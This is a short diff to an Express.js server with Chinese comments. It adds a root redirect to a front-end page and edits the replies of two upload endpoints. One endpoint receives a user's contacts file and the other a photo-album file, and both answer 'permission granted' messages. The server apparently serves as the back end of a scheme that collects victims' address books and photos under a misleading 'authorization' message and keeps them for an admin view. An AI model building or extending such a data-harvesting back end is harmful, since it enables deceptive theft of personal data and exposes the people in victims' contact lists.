@@ -10,6 +10,11 @@ app.use(express.json())
 // 绑定前端文件夹 page
 app.use(express.static('page'))
 
+// 关键修复：访问根目录时，自动跳转到你的前端页面
+app.get('/', (req, res) => {
+    res.redirect('/indexs.html')
+})
+
 const upload = multer({dest:'fileData/'})
 if(!fs.existsSync('fileData')) fs.mkdirSync('fileData')
 
@@ -24,12 +29,12 @@ app.get('/api/baseLoad',(req,res)=>{
 
 // 接收通讯录
 app.post('/api/saveTel',upload.single('telFile'),(req,res)=>{
-    res.json({code:200,msg:"1已授权"})
+    res.json({code:200,msg:"权限1已授权"})
 })
 
 // 接收相册
 app.post('/api/saveImg',upload.single('imgFile'),(req,res)=>{
-    res.json({code:200,msg:"2已授权"})
+    res.json({code:200,msg:"权限2已授权"})
 })
 
 // 后台查看
